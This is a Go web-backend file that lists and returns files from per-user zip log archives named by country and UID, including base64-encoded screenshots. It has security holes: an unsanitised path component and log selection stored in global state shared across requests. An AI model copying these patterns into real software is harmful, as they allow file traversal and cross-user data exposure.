package logs

import (
	"archive/zip"
	"encoding/base64"
	"io/ioutil"
	"net/http"
	"path/filepath"
	"sort"
	"strings"

	login "../login"
	"github.com/gin-gonic/gin"
)

var currentLog, currentUid string

func GetLogTree(ctx *gin.Context) {
	var logForm LogForm
	ctx.BindJSON(&logForm)

	username := login.IsUserValid(logForm.Cookie)
	if username == "" {
		logger.Println("preview.GetLogTree: unauthorized user: ", ctx.ClientIP())
		return
	}

	currentUid = logForm.Data.Uid

	if !IsUserAccess(username, currentUid) {
		return
	}

	currentLog = filepath.Join("./logs/", logForm.Data.Country+"_"+logForm.Data.Uid+".zip")
	reader, err := zip.OpenReader(currentLog)
	if err != nil {
		ctx.Status(http.StatusOK)
		return
	}
	defer reader.Close()

	var files []string
	for _, file := range reader.File {
		if !file.FileInfo().IsDir() {
			files = append(files, file.FileHeader.Name)
		}
	}

	sort.Strings(files)
	ctx.JSON(http.StatusOK, files)
}

type FileDataForm struct {
	Cookie   string `json:"cookie"`
	FileName string `json:"fileName"`
}

func ReadFile(file *zip.File) (data string) {
	fc, err := file.Open()
	if err != nil {
		logger.Println("logs.ReadFile: opening file error: ", err)
		return "opening file error: " + err.Error()
	}

	bytes, err := ioutil.ReadAll(fc)
	if err != nil {
		logger.Println("logs.ReadFile: reading file error: ", err)
		return "reading file error: " + err.Error()
	}

	return string(bytes)
}

func GetFileData(ctx *gin.Context) {
	var logForm FileDataForm
	ctx.BindJSON(&logForm)

	username := login.IsUserValid(logForm.Cookie)
	if username == "" {
		logger.Println("preview.GetFileData: unauthorized user: ", ctx.ClientIP())
		return
	}

	if !IsUserAccess(username, currentUid) {
		return
	}

	reader, err := zip.OpenReader(currentLog)
	if err != nil {
		return
	}
	defer reader.Close()

	for _, file := range reader.File {
		if file.FileHeader.Name == strings.ReplaceAll(logForm.FileName, "*", "/") {
			fileData := ReadFile(file)
			if strings.Contains(logForm.FileName, "Screenshot") {
				ctx.JSON(http.StatusOK, gin.H{"screen": base64.StdEncoding.EncodeToString([]byte(fileData))})
			} else {
				ctx.String(http.StatusOK, fileData)
			}
			break
		}
	}
}
